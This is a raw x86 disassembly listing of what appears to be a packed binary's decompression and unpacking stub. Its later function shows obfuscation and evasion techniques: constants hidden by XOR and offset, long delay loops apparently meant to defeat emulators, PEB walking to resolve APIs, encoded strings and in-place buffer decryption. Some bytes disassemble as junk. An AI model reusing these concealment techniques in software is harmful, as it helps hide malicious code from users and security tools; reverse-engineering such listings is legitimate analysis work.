  42477d:	mov    esi,0x100
  424782:	push   eax
  424783:	mov    al,0x1
  424785:	jb     0x4247bb
  424787:	mov    edi,DWORD PTR [ebp-0x4]
  42478a:	sub    edi,DWORD PTR [ebp-0x24]
  42478d:	movzx  edi,BYTE PTR [edi]
  424790:	mov    ebp,DWORD PTR [ebp-0x34]
  424793:	shl    edi,1
  424795:	mov    ecx,esi
  424797:	and    esi,edi
  424799:	add    ecx,esi
  42479b:	lea    ebp,[ebp+ecx*2+0x0]
  42479f:	call   0x424a54
  4247a4:	mov    ecx,eax
  4247a6:	shr    esi,0x8
  4247a9:	and    ecx,0x1
  4247ac:	cmp    esi,ecx
  4247ae:	mov    esi,0x100
  4247b3:	jne    0x4247c3
  4247b5:	cmp    eax,esi
  4247b7:	jb     0x424790
  4247b9:	jmp    0x4247cf
  4247bb:	mov    ebp,DWORD PTR [ebp-0x34]
  4247be:	call   0x424a54
  4247c3:	inc    eax
  4247c4:	inc    esi
  4247c5:	sub    eax,0x1
  4247c8:	sub    esi,0x1
  4247cb:	cmp    eax,esi
  4247cd:	jb     0x4247bb
  4247cf:	pop    edx
  4247d0:	inc    edx
  4247d1:	cmp    edx,0x5
  4247d4:	dec    edx
  4247d5:	mov    ecx,edx
  4247d7:	jb     0x4247e8
  4247d9:	inc    edx
  4247da:	cmp    edx,0xb
  4247dd:	dec    edx
  4247de:	mov    cl,0x4
  4247e0:	dec    cl
  4247e2:	jb     0x4247e8
  4247e4:	mov    cl,0x7
  4247e6:	dec    cl
  4247e8:	sub    edx,ecx
  4247ea:	push   edx
  4247eb:	jmp    0x42483c
  4247ed:	mov    al,0xc1
  4247ef:	dec    al
  4247f1:	call   0x424a45
  4247f6:	jne    0x42480c
  4247f8:	pop    eax
  4247f9:	pop    edi
  4247fa:	pop    edx
  4247fb:	pop    ecx
  4247fc:	pop    edx
  4247fd:	pop    ecx
  4247fe:	push   DWORD PTR [esp]
  424801:	push   ecx
  424802:	push   edx
  424803:	mov    edx,0x664
  424808:	mov    cl,0x0
  42480a:	jmp    0x42487f
  42480c:	mov    al,0xcd
  42480e:	dec    al
  424810:	call   0x424a45
  424815:	jne    0x424845
  424817:	mov    al,0xf1
  424819:	dec    al
  42481b:	call   0x424a35
  424820:	jne    0x424875
  424822:	pop    eax
  424823:	cmp    al,0x7
  424825:	mov    al,0x9
  424827:	jb     0x42482b
  424829:	mov    al,0xb
  42482b:	push   eax
  42482c:	mov    esi,DWORD PTR [ebp-0x4]
  42482f:	sub    esi,DWORD PTR [ebp-0x24]
  424832:	cmp    esi,DWORD PTR [ebp+0x24]
  424835:	jb     0x424a0c
  42483b:	lods   al,BYTE PTR ds:[esi]
  42483c:	mov    edi,DWORD PTR [ebp-0x4]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	jmp    0x4249d3
  424845:	mov    al,0xd8
  424847:	call   0x424a45
  42484c:	mov    esi,DWORD PTR [ebp-0x28]
  42484f:	je     0x42486c
  424851:	mov    al,0xe4
  424853:	call   0x424a45
  424858:	mov    esi,DWORD PTR [ebp-0x2c]
  42485b:	je     0x424866
  42485d:	mov    esi,DWORD PTR [ebp-0x30]
  424860:	mov    ecx,DWORD PTR [ebp-0x2c]
  424863:	mov    DWORD PTR [ebp-0x30],ecx
  424866:	mov    ecx,DWORD PTR [ebp-0x28]
  424869:	mov    DWORD PTR [ebp-0x2c],ecx
  42486c:	mov    ecx,DWORD PTR [ebp-0x24]
  42486f:	mov    DWORD PTR [ebp-0x28],ecx
  424872:	mov    DWORD PTR [ebp-0x24],esi
  424875:	pop    eax
  424876:	pop    edi
  424877:	pop    ecx
  424878:	mov    edx,0xa68
  42487d:	mov    cl,0x8
  42487f:	add    edx,edi
  424881:	push   edx
  424882:	push   edi
  424883:	cmp    al,0x7
  424885:	mov    al,cl
  424887:	jb     0x42488b
  424889:	add    al,0x3
  42488b:	push   eax
  42488c:	mov    ebp,DWORD PTR [ebp-0x34]
  42488f:	call   0x424a52
  424894:	jne    0x4248aa
  424896:	mov    eax,DWORD PTR [ebp-0x18]
  424899:	mov    edi,DWORD PTR [ebp-0x34]
  42489c:	shl    eax,0x3
  42489f:	sub    ecx,ecx
  4248a1:	push   0x8
  4248a3:	pop    esi
  4248a4:	lea    edi,[edi+eax*2+0x4]
  4248a8:	jmp    0x4248df
  4248aa:	mov    ebp,DWORD PTR [ebp-0x34]
  4248ad:	add    ebp,0x2
  4248b0:	call   0x424a52
  4248b5:	jne    0x4248cf
  4248b7:	mov    eax,DWORD PTR [ebp-0x18]
  4248ba:	mov    edi,DWORD PTR [ebp-0x34]
  4248bd:	shl    eax,0x3
  4248c0:	push   0x8
  4248c2:	pop    ecx
  4248c3:	push   0x8
  4248c5:	pop    esi
  4248c6:	lea    edi,[edi+eax*2+0x104]
  4248cd:	jmp    0x4248df
  4248cf:	mov    edi,0x204
  4248d4:	add    edi,DWORD PTR [ebp-0x34]
  4248d7:	push   0x10
  4248d9:	pop    ecx
  4248da:	mov    esi,0x100
  4248df:	mov    DWORD PTR [ebp-0x1c],ecx
  4248e2:	sub    eax,eax
  4248e4:	inc    eax
  4248e5:	mov    ebp,edi
  4248e7:	call   0x424a54
  4248ec:	mov    ecx,eax
  4248ee:	sub    ecx,esi
  4248f0:	jb     0x4248e5
  4248f2:	add    DWORD PTR [ebp-0x1c],ecx
  4248f5:	cmp    DWORD PTR [ebp-0x3c],0x4
  4248f9:	jae    0x4249af
  4248ff:	add    DWORD PTR [ebp-0x3c],0x7
  424903:	mov    ecx,DWORD PTR [ebp-0x1c]
  424906:	cmp    ecx,0x4
  424909:	jb     0x42490e
  42490b:	push   0x3
  42490d:	pop    ecx
  42490e:	mov    edi,DWORD PTR [ebp-0x38]
  424911:	shl    ecx,0x6
  424914:	sub    eax,eax
  424916:	inc    eax
  424917:	push   0x40
  424919:	pop    esi
  42491a:	lea    edi,[edi+ecx*2+0x360]
  424921:	mov    ebp,edi
  424923:	call   0x424a54
  424928:	mov    ecx,eax
  42492a:	sub    ecx,esi
  42492c:	jb     0x424921
  42492e:	mov    DWORD PTR [ebp-0x18],ecx
  424931:	mov    DWORD PTR [ebp-0x24],ecx
  424934:	cmp    ecx,0x4
  424937:	jb     0x4249ac
  424939:	mov    esi,ecx
  42493b:	and    DWORD PTR [ebp-0x24],0x1
  42493f:	shr    esi,1
  424941:	or     DWORD PTR [ebp-0x24],0x2
  424945:	dec    esi
  424946:	cmp    ecx,0xe
  424949:	jae    0x424964
  42494b:	mov    eax,0x2af
  424950:	sub    eax,ecx
  424952:	mov    ecx,esi
  424954:	shl    BYTE PTR [ebp-0x24],cl
  424957:	add    eax,DWORD PTR [ebp-0x24]
  42495a:	shl    eax,1
  42495c:	add    eax,DWORD PTR [ebp-0x38]
  42495f:	mov    DWORD PTR [ebp-0x34],eax
  424962:	jmp    0x424991
  424964:	sub    esi,0x4
  424967:	call   0x424a11
  42496c:	shr    ebx,1
  42496e:	shl    DWORD PTR [ebp-0x24],1
  424971:	cmp    DWORD PTR [ebp-0x20],ebx
  424974:	jb     0x42497c
  424976:	inc    DWORD PTR [ebp-0x24]
  424979:	sub    DWORD PTR [ebp-0x20],ebx
  42497c:	dec    esi
  42497d:	jne    0x424967
  42497f:	mov    eax,0x644
  424984:	add    eax,DWORD PTR [ebp-0x38]
  424987:	mov    DWORD PTR [ebp-0x34],eax
  42498a:	shl    DWORD PTR [ebp-0x24],0x4
  42498e:	push   0x4
  424990:	pop    esi
  424991:	sub    edi,edi
  424993:	inc    edi
  424994:	mov    eax,edi
  424996:	mov    ebp,DWORD PTR [ebp-0x34]
  424999:	call   0x424a54
  42499e:	test   al,0x1
  4249a0:	je     0x4249a5
  4249a2:	or     DWORD PTR [ebp-0x24],edi
  4249a5:	shl    edi,1
  4249a7:	dec    esi
  4249a8:	jne    0x424996
  4249aa:	jmp    0x4249ac
  4249ac:	inc    DWORD PTR [ebp-0x24]
  4249af:	mov    ecx,DWORD PTR [ebp-0x1c]
  4249b2:	add    ecx,0x2
  4249b5:	mov    edi,DWORD PTR [ebp-0x4]
  4249b8:	mov    eax,edi
  4249ba:	sub    eax,DWORD PTR [ebp+0x24]
  4249bd:	cmp    DWORD PTR [ebp-0x24],eax
  4249c0:	ja     0x424a0c
  4249c2:	mov    esi,edi
  4249c4:	sub    esi,DWORD PTR [ebp-0x24]
  4249c7:	mov    edx,DWORD PTR [ebp+0x28]
  4249ca:	lods   al,BYTE PTR ds:[esi]
  4249cb:	stos   BYTE PTR es:[edi],al
  4249cc:	cmp    edi,edx
  4249ce:	jae    0x4249d3
  4249d0:	dec    ecx
  4249d1:	jne    0x4249ca
  4249d3:	mov    DWORD PTR [ebp-0x4],edi
  4249d6:	movzx  esi,al
  4249d9:	cmp    edi,DWORD PTR [ebp+0x28]
  4249dc:	jb     0x42473d
  4249e2:	call   0x424a11
  4249e7:	sub    eax,eax
  4249e9:	lea    ebp,[esp+0x3c]
  4249ed:	mov    edx,DWORD PTR [ebp+0x20]
  4249f0:	mov    esi,DWORD PTR [ebp-0x8]
  4249f3:	sub    esi,DWORD PTR [ebp+0x18]
  4249f6:	mov    DWORD PTR [edx],esi
  4249f8:	mov    edx,DWORD PTR [ebp+0x2c]
  4249fb:	mov    edi,DWORD PTR [ebp-0x4]
  4249fe:	sub    edi,DWORD PTR [ebp+0x24]
  424a01:	mov    DWORD PTR [edx],edi
  424a03:	leave  
  424a04:	pop    ebx
  424a05:	pop    esi
  424a06:	pop    edi
  424a07:	ret    0x1c
  424a0a:	pop    esi
  424a0b:	pop    eax
  424a0c:	sub    eax,eax
  424a0e:	inc    eax
  424a0f:	jmp    0x4249e9
  424a11:	cmp    ebx,0x1000000
  424a17:	jb     0x424a1a
  424a19:	ret    
  424a1a:	shl    ebx,0x8
  424a1d:	push   esi
  424a1e:	mov    esi,DWORD PTR [ebp-0x8]
  424a21:	jbe    0x424a82
  424a23:	cli    
  424a24:	push   edi
  424a25:	sbb    eax,0x910d9fb8
  424a2a:	or     eax,0x9fb03caa
  424a2f:	or     eax,0x36d5fb0
  424a34:	cdq    
  424a35:	mov    eax,0x64c69dbf
  424a3a:	lea    edx,[ecx-0x606965ef]
  424a40:	sub    eax,0xa2399196
  424a45:	(bad)  
  424a46:	lea    edx,fs:[esi+0x3fb89d9f]
  424a4d:	lods   eax,DWORD PTR ds:[esi]
  424a4e:	sar    BYTE PTR [ebx],0x9f
  424a51:	mov    dh,BYTE PTR [esi]
  424a53:	(bad)  
  424a54:	sar    BYTE PTR [ebx],0x9f
  424a57:	mov    dl,BYTE PTR [eax-0x75757587]
  424a5d:	mov    ss,WORD PTR [edi-0x6]
  424a60:	mov    eax,0x916a1abb
  424a65:	sbb    ebx,DWORD PTR [edx]
  424a67:	or     ch,BYTE PTR [edx-0x4e5448a]
  424a6d:	push   edi
  424a6e:	cld    
  424a6f:	mov    ah,0xce
  424a71:	mov    DWORD PTR [ebx+0x19916a1a],ebx
  424a77:	stos   BYTE PTR es:[edi],al
  424a78:	lods   al,BYTE PTR ds:[esi]
  424a79:	fistp  DWORD PTR [edx]
  424a7b:	or     bh,BYTE PTR [eax-0x20973947]
  424a81:	mov    dl,BYTE PTR [ecx+0x48c6b631]
  424a87:	mov    ch,0x6e
  424a89:	mov    ebx,0xe6570a1a
  424a8e:	mov    eax,0xaa8a70f1
  424a93:	mov    cl,BYTE PTR [edx+0x3191b536]
  424a99:	sahf   
  424a9a:	and    ecx,DWORD PTR [esi-0x72697541]
  424aa0:	shr    BYTE PTR [esp+0x40],0xc3
  424aa5:	shr    edx,0x5
  424aa8:	sub    DWORD PTR [esp+0x20],ecx
  424aac:	sub    ebx,ecx
  424aae:	sub    WORD PTR [ebp+0x0],dx
  424ab2:	add    eax,eax
  424ab4:	add    eax,0x1
  424ab7:	lea    ebp,[esp+0x40]
  424abb:	ret    
  424abc:	push   ebp
  424abd:	mov    ebp,esp
  424abf:	sub    esp,0x12c
  424ac5:	push   ebx
  424ac6:	push   esi
  424ac7:	push   edi
  424ac8:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  424acf:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  424ad6:	mov    eax,DWORD PTR [ebp+0x8]
  424ad9:	mov    DWORD PTR [ebp+0x8],eax
  424adc:	mov    ecx,DWORD PTR [ebp-0x10]
  424adf:	mov    ebx,0x75108b1
  424ae4:	xor    ecx,ebx
  424ae6:	mov    eax,0x3272f8
  424aeb:	add    ecx,eax
  424aed:	mov    DWORD PTR [ebp-0x24],ecx
  424af0:	mov    ecx,DWORD PTR [ebp-0x10]
  424af3:	xor    ecx,ebx
  424af5:	add    ecx,eax
  424af7:	mov    DWORD PTR [ebp-0x40],ecx
  424afa:	mov    ecx,DWORD PTR [ebp-0x10]
  424afd:	xor    ecx,ebx
  424aff:	add    ecx,eax
  424b01:	mov    DWORD PTR [ebp-0x3c],ecx
  424b04:	mov    ecx,DWORD PTR [ebp-0x10]
  424b07:	xor    ecx,ebx
  424b09:	add    ecx,eax
  424b0b:	mov    DWORD PTR [ebp-0xd8],ecx
  424b11:	mov    DWORD PTR [ebp-0x50],0xf89f05b9
  424b18:	mov    DWORD PTR [ebp-0x3c],0xf89cb5b9
  424b1f:	mov    DWORD PTR [ebp-0x54],0xf89c85bd
  424b26:	push   0x25
  424b28:	pop    ecx
  424b29:	mov    DWORD PTR [ebp-0x30],ecx
  424b2c:	mov    DWORD PTR [ebp-0x30],ecx
  424b2f:	push   0x65
  424b31:	pop    ecx
  424b32:	mov    DWORD PTR [ebp-0x30],ecx
  424b35:	mov    DWORD PTR [ebp-0x30],ecx
  424b38:	mov    DWORD PTR [ebp-0x30],0x4d
  424b3f:	mov    DWORD PTR [ebp-0x30],0x43
  424b46:	mov    ecx,DWORD PTR [ebp-0x10]
  424b49:	xor    ecx,ebx
  424b4b:	add    ecx,eax
  424b4d:	mov    DWORD PTR [ebp-0x30],ecx
  424b50:	mov    ecx,DWORD PTR [ebp-0x10]
  424b53:	xor    ecx,ebx
  424b55:	add    ecx,eax
  424b57:	mov    DWORD PTR [ebp-0x30],ecx
  424b5a:	mov    DWORD PTR [ebp-0x28],0x258
  424b61:	mov    DWORD PTR [ebp-0x34],0x36
  424b68:	mov    DWORD PTR [ebp-0x14],0x7a
  424b6f:	lea    edi,[ebp-0x10c]
  424b75:	lea    esi,[ebp-0x12c]
  424b7b:	call   0x42583b
  424b80:	dec    DWORD PTR [ebp-0x14]
  424b83:	jne    0x424b6f
  424b85:	dec    DWORD PTR [ebp-0x34]
  424b88:	jne    0x424b68
  424b8a:	dec    DWORD PTR [ebp-0x28]
  424b8d:	jne    0x424b61
  424b8f:	mov    DWORD PTR [ebp-0x28],0x400e
  424b96:	mov    eax,DWORD PTR [ebp-0x10]
  424b99:	xor    eax,ebx
  424b9b:	mov    esi,0x3272f8
  424ba0:	add    eax,esi
  424ba2:	mov    DWORD PTR [ebp-0x1c],eax
  424ba5:	mov    eax,DWORD PTR [ebp-0x10]
  424ba8:	and    DWORD PTR [ebp-0x94],0x0
  424baf:	xor    eax,ebx
  424bb1:	add    eax,esi
  424bb3:	mov    DWORD PTR [ebp-0x38],eax
  424bb6:	mov    eax,fs:0x18
  424bbc:	mov    DWORD PTR [ebp-0x94],eax
  424bc2:	mov    eax,DWORD PTR [eax+0x30]
  424bc5:	mov    DWORD PTR [ebp-0xcc],eax
  424bcb:	mov    eax,DWORD PTR [eax+0xc]
  424bce:	mov    DWORD PTR [ebp-0xc0],eax
  424bd4:	mov    eax,DWORD PTR [ebp+0x8]
  424bd7:	lea    ecx,[ebp-0x94]
  424bdd:	mov    DWORD PTR [eax+0x1a0],ecx
  424be3:	mov    eax,DWORD PTR [ebp+0x8]
  424be6:	lea    ecx,[ebp-0xcc]
  424bec:	mov    DWORD PTR [eax+0x1a4],ecx
  424bf2:	mov    eax,DWORD PTR [ebp+0x8]
  424bf5:	push   DWORD PTR [ebp+0x8]
  424bf8:	lea    ecx,[ebp-0xc0]
  424bfe:	mov    DWORD PTR [eax+0x1a8],ecx
  424c04:	call   0x426ffc
  424c09:	mov    ecx,DWORD PTR [ebp-0x10]
  424c0c:	xor    ecx,ebx
  424c0e:	add    ecx,esi
  424c10:	cmp    ecx,eax
  424c12:	je     0x424f95
  424c18:	mov    eax,DWORD PTR [ebp+0x8]
  424c1b:	mov    eax,DWORD PTR [eax+0x194]
  424c21:	mov    ecx,DWORD PTR [eax]
  424c23:	mov    eax,DWORD PTR [ebp+0x8]
  424c26:	mov    eax,DWORD PTR [eax+0x194]
  424c2c:	mov    eax,DWORD PTR [eax]
  424c2e:	add    eax,DWORD PTR [ecx+0x3c]
  424c31:	mov    ecx,DWORD PTR [ebp+0x8]
  424c34:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424c3a:	lea    edx,[ebp-0xec]
  424c40:	push   edx
  424c41:	mov    edx,DWORD PTR [ebp+0x8]
  424c44:	mov    edx,DWORD PTR [edx+0x18c]
  424c4a:	mov    edx,DWORD PTR [edx]
  424c4c:	add    edx,DWORD PTR [eax+0x88]
  424c52:	push   0x4
  424c54:	push   DWORD PTR [eax+0x8c]
  424c5a:	push   edx
  424c5b:	call   DWORD PTR [ecx+0x1c]
  424c5e:	push   DWORD PTR [ebp+0x8]
  424c61:	xor    eax,eax
  424c63:	mov    DWORD PTR [ebp-0xa8],0xe3beeec4
  424c6d:	mov    DWORD PTR [ebp-0xa4],0xeac7eddc
  424c77:	mov    DWORD PTR [ebp-0xa0],0xbcede0f2
  424c81:	mov    BYTE PTR [ebp-0x9c],0x7b
  424c88:	lea    edi,[ebp-0x9b]
  424c8e:	stos   DWORD PTR es:[edi],eax
  424c8f:	stos   WORD PTR es:[edi],ax
  424c91:	stos   BYTE PTR es:[edi],al
  424c92:	xor    eax,eax
  424c94:	mov    DWORD PTR [ebp-0xbc],0xe3beeec4
  424c9e:	mov    DWORD PTR [ebp-0xb8],0xeac7eddc
  424ca8:	mov    DWORD PTR [ebp-0xb4],0xd2ede0f2
  424cb2:	mov    BYTE PTR [ebp-0xb0],0x7b
  424cb9:	lea    edi,[ebp-0xaf]
  424cbf:	stos   DWORD PTR es:[edi],eax
  424cc0:	stos   WORD PTR es:[edi],ax
  424cc2:	stos   BYTE PTR es:[edi],al
  424cc3:	mov    edi,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edx,DWORD PTR [eax+0x1b8]
  424ccf:	mov    DWORD PTR [ebp-0x68],0xedefeee7
  424cd6:	mov    DWORD PTR [ebp-0x64],0xe4ebe8de
  424cdd:	mov    WORD PTR [ebp-0x60],0x7bbc
  424ce3:	mov    DWORD PTR [ebp-0x90],0xe3beeec4
  424ced:	mov    DWORD PTR [ebp-0x8c],0xe7bceddc
  424cf7:	mov    DWORD PTR [ebp-0x88],0xc9dce3eb
  424d01:	mov    DWORD PTR [ebp-0x84],0xede0e8f0
  424d0b:	mov    DWORD PTR [ebp-0x80],0x7bbcdee4
  424d12:	mov    DWORD PTR [ebp-0x7c],0xe3beeec4
  424d19:	mov    DWORD PTR [ebp-0x78],0xe7bceddc
  424d20:	mov    DWORD PTR [ebp-0x74],0xc9dce3eb
  424d27:	mov    DWORD PTR [ebp-0x70],0xede0e8f0
  424d2e:	mov    DWORD PTR [ebp-0x6c],0x7bd2dee4
  424d35:	call   0x42702b
  424d3a:	push   eax
  424d3b:	mov    eax,DWORD PTR [ebp+0x8]
  424d3e:	mov    eax,DWORD PTR [eax+0x1a8]
  424d44:	push   DWORD PTR [eax]
  424d46:	call   0x426ccc
  424d4b:	test   eax,eax
  424d4d:	jne    0x424d9f
  424d4f:	mov    eax,DWORD PTR [ebp+0x8]
  424d52:	mov    eax,DWORD PTR [eax+0x1e0]
  424d58:	mov    edi,DWORD PTR [ebp+0x8]
  424d5b:	add    eax,0x4
  424d5e:	mov    DWORD PTR [ebp-0x20],eax
  424d61:	mov    eax,DWORD PTR [ebp+0x8]
  424d64:	mov    edx,DWORD PTR [eax+0x1b8]
  424d6a:	call   0x42702b
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x20]
  424d73:	call   DWORD PTR [eax]
  424d75:	test   eax,eax
  424d77:	jne    0x424d9f
  424d79:	mov    eax,DWORD PTR [ebp+0x8]
  424d7c:	mov    eax,DWORD PTR [eax+0x1e0]
  424d82:	mov    edi,DWORD PTR [ebp+0x8]
  424d85:	add    eax,0x10
  424d88:	mov    DWORD PTR [ebp-0x20],eax
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	mov    edx,DWORD PTR [eax+0x1b8]
  424d94:	call   0x42702b
  424d99:	push   eax
  424d9a:	mov    eax,DWORD PTR [ebp-0x20]
  424d9d:	call   DWORD PTR [eax]
  424d9f:	mov    eax,DWORD PTR [ebp-0x10]
  424da2:	mov    ecx,DWORD PTR [ebp-0x28]
  424da5:	xor    eax,ebx
  424da7:	add    eax,esi
  424da9:	cmp    eax,ecx
  424dab:	je     0x424f6e
  424db1:	mov    eax,DWORD PTR [ebp-0x18]
  424db4:	xor    eax,ebx
  424db6:	mov    ecx,0xffcd8d08
  424dbb:	sub    ecx,eax
  424dbd:	add    ecx,DWORD PTR [ebp-0x28]
  424dc0:	mov    eax,DWORD PTR [ebp-0x1c]
  424dc3:	cmp    eax,ecx
  424dc5:	ja     0x424f6e
  424dcb:	mov    DWORD PTR [ebp-0x34],0x0
  424dd2:	push   DWORD PTR [ebp+0x8]
  424dd5:	mov    edi,DWORD PTR [ebp+0x8]
  424dd8:	mov    eax,DWORD PTR [ebp+0x8]
  424ddb:	mov    edx,DWORD PTR [eax+0x1b4]
  424de1:	call   0x42702b
  424de6:	push   eax
  424de7:	mov    eax,DWORD PTR [ebp+0x8]
  424dea:	mov    eax,DWORD PTR [eax+0x1a8]
  424df0:	push   DWORD PTR [eax]
  424df2:	call   0x426ccc
  424df7:	mov    ecx,DWORD PTR [ebp+0x8]
  424dfa:	mov    ecx,DWORD PTR [ecx+0x19c]
  424e00:	mov    DWORD PTR [ecx],eax
  424e02:	mov    eax,DWORD PTR [ebp+0x8]
  424e05:	mov    edi,DWORD PTR [eax+0x1e0]
  424e0b:	mov    esi,DWORD PTR [ebp+0x8]
  424e0e:	xor    eax,eax
  424e10:	lea    edx,[ebp-0x7c]
  424e13:	call   0x427061
  424e18:	push   eax
  424e19:	mov    eax,DWORD PTR [ebp+0x8]
  424e1c:	mov    eax,DWORD PTR [eax+0x19c]
  424e22:	push   DWORD PTR [eax]
  424e24:	call   DWORD PTR [edi+0x8]
  424e27:	mov    DWORD PTR [ebp-0x20],eax
  424e2a:	mov    eax,DWORD PTR [ebp+0x8]
  424e2d:	mov    edi,DWORD PTR [eax+0x1e0]
  424e33:	mov    esi,DWORD PTR [ebp+0x8]
  424e36:	xor    eax,eax
  424e38:	lea    edx,[ebp-0x90]
  424e3e:	call   0x427061
  424e43:	push   eax
  424e44:	mov    eax,DWORD PTR [ebp+0x8]
  424e47:	mov    eax,DWORD PTR [eax+0x19c]
  424e4d:	push   DWORD PTR [eax]
  424e4f:	call   DWORD PTR [edi+0x8]
  424e52:	mov    eax,DWORD PTR [ebp+0x8]
  424e55:	mov    edi,DWORD PTR [eax+0x1e0]
  424e5b:	mov    esi,DWORD PTR [ebp+0x8]
  424e5e:	xor    eax,eax
  424e60:	lea    edx,[ebp-0xa8]
  424e66:	call   0x427061
  424e6b:	push   eax
  424e6c:	mov    eax,DWORD PTR [ebp+0x8]
  424e6f:	mov    eax,DWORD PTR [eax+0x19c]
  424e75:	push   DWORD PTR [eax]
  424e77:	call   DWORD PTR [edi+0x8]
  424e7a:	and    DWORD PTR [ebp-0x8],0x0
  424e7e:	mov    DWORD PTR [ebp-0x48],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x8]
  424e84:	and    eax,0x7
  424e87:	add    eax,0x31
  424e8a:	push   eax
  424e8b:	call   DWORD PTR [ebp-0x20]
  424e8e:	test   eax,eax
  424e90:	je     0x424ed4
  424e92:	mov    eax,DWORD PTR [ebp-0x8]
  424e95:	push   0x19
  424e97:	xor    edx,edx
  424e99:	pop    ecx
  424e9a:	div    ecx
  424e9c:	add    dl,0x41
  424e9f:	movzx  eax,dl
  424ea2:	push   eax
  424ea3:	call   DWORD PTR [ebp-0x48]
  424ea6:	test   eax,eax
  424ea8:	jne    0x424ed4
  424eaa:	mov    eax,DWORD PTR [ebp+0x8]
  424ead:	mov    edi,DWORD PTR [eax+0x1e0]
  424eb3:	mov    esi,DWORD PTR [ebp+0x8]
  424eb6:	xor    eax,eax
  424eb8:	lea    edx,[ebp-0x68]
  424ebb:	call   0x427061
  424ec0:	push   eax
  424ec1:	mov    eax,DWORD PTR [ebp+0x8]
  424ec4:	mov    eax,DWORD PTR [eax+0x198]
  424eca:	push   DWORD PTR [eax]
  424ecc:	call   DWORD PTR [edi+0x8]
  424ecf:	mov    DWORD PTR [ebp-0x14],eax
  424ed2:	jmp    0x424ed8
  424ed4:	and    DWORD PTR [ebp-0x14],0x0
  424ed8:	inc    DWORD PTR [ebp-0x8]
  424edb:	cmp    DWORD PTR [ebp-0x8],0x10
  424edf:	jb     0x424e81
  424ee1:	mov    eax,DWORD PTR [ebp-0x18]
  424ee4:	mov    esi,DWORD PTR [ebp+0x8]
  424ee7:	xor    eax,ebx
  424ee9:	mov    edi,0x3272f8
  424eee:	add    eax,edi
  424ef0:	lea    edx,[ebp-0x10c]
  424ef6:	call   0x427061
  424efb:	push   eax
  424efc:	mov    eax,DWORD PTR [ebp-0x10]
  424eff:	mov    esi,DWORD PTR [ebp+0x8]
  424f02:	xor    eax,ebx
  424f04:	add    eax,edi
  424f06:	lea    edx,[ebp-0x12c]
  424f0c:	call   0x427061
  424f11:	push   eax
  424f12:	call   DWORD PTR [ebp-0x14]
  424f15:	mov    ecx,DWORD PTR [ebp-0x10]
  424f18:	xor    ecx,ebx
  424f1a:	add    ecx,edi
  424f1c:	cmp    ecx,eax
  424f1e:	jne    0x424f27
  424f20:	mov    DWORD PTR [ebp-0x34],0x1
  424f27:	mov    eax,DWORD PTR [ebp-0x18]
  424f2a:	mov    ecx,DWORD PTR [ebp-0x1c]
  424f2d:	xor    eax,ebx
  424f2f:	lea    eax,[eax+ecx*1+0x3272f8]
  424f36:	mov    DWORD PTR [ebp-0x1c],eax
  424f39:	mov    eax,DWORD PTR [ebp-0x34]
  424f3c:	test   eax,eax
  424f3e:	je     0x424f52
  424f40:	mov    eax,DWORD PTR [ebp-0x18]
  424f43:	mov    ecx,DWORD PTR [ebp-0x38]
  424f46:	xor    eax,ebx
  424f48:	lea    eax,[eax+ecx*1+0x3272f8]
  424f4f:	mov    DWORD PTR [ebp-0x38],eax
  424f52:	mov    eax,DWORD PTR [ebp-0x18]
  424f55:	xor    eax,ebx
  424f57:	mov    ecx,0xffcd8d08
  424f5c:	sub    ecx,eax
  424f5e:	add    ecx,DWORD PTR [ebp-0x28]
  424f61:	mov    eax,DWORD PTR [ebp-0x1c]
  424f64:	cmp    eax,ecx
  424f66:	jbe    0x424dcb
  424f6c:	mov    esi,edi
  424f6e:	mov    eax,DWORD PTR [ebp-0x38]
  424f71:	mov    ecx,DWORD PTR [ebp-0x1c]
  424f74:	cmp    ecx,eax
  424f76:	jne    0x424f89
  424f78:	push   DWORD PTR [ebp+0x8]
  424f7b:	lea    eax,[ebp-0x40]
  424f7e:	push   eax
  424f7f:	call   0x427ad0
  424f84:	mov    DWORD PTR [ebp-0x24],eax
  424f87:	jmp    0x424f95
  424f89:	mov    eax,DWORD PTR [ebp-0x24]
  424f8c:	mov    ecx,DWORD PTR [ebp-0x18]
  424f8f:	xor    ecx,ebx
  424f91:	add    ecx,esi
  424f93:	xor    DWORD PTR [eax],ecx
  424f95:	mov    eax,DWORD PTR [ebp-0x10]
  424f98:	mov    ecx,DWORD PTR [ebp-0x24]
  424f9b:	xor    eax,ebx
  424f9d:	add    eax,esi
  424f9f:	cmp    eax,ecx
  424fa1:	je     0x425719
  424fa7:	mov    eax,DWORD PTR [ebp-0x10]
  424faa:	mov    ecx,DWORD PTR [ebp-0x40]
  424fad:	xor    eax,ebx
  424faf:	add    eax,esi
  424fb1:	cmp    eax,ecx
  424fb3:	je     0x425719
  424fb9:	mov    eax,DWORD PTR [ebp-0x10]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	jmp    0x424fde
  424fc2:	mov    edi,DWORD PTR [ebp-0x24]
  424fc5:	mov    cl,al
  424fc7:	and    cl,0x1f
  424fca:	or     dl,0xff
  424fcd:	sub    dl,cl
  424fcf:	add    BYTE PTR [edi+eax*1],dl
  424fd2:	mov    ecx,DWORD PTR [ebp-0x18]
  424fd5:	xor    ecx,ebx
  424fd7:	lea    eax,[eax+ecx*1+0x3272f8]
  424fde:	mov    ecx,DWORD PTR [ebp-0x40]
  424fe1:	cmp    eax,ecx
  424fe3:	jb     0x424fc2
  424fe5:	mov    eax,DWORD PTR [ebp-0x40]
  424fe8:	mov    DWORD PTR [ebp-0x28],eax
  424feb:	mov    eax,DWORD PTR [ebp-0x24]
  424fee:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  424ff5:	mov    DWORD PTR [ebp-0xd4],eax
  424ffb:	mov    edi,0xf89c85b8
  425000:	mov    DWORD PTR [ebp-0x2c],edi
  425003:	mov    eax,DWORD PTR [ebp-0x38]
  425006:	xor    eax,ebx
  425008:	add    eax,esi
  42500a:	mov    DWORD PTR [ebp-0xc],eax
  42500d:	mov    eax,DWORD PTR [ebp-0x38]
  425010:	xor    eax,ebx
  425012:	add    eax,esi
  425014:	mov    DWORD PTR [ebp-0x8],eax
  425017:	mov    DWORD PTR [ebp-0x48],0xf89c8599
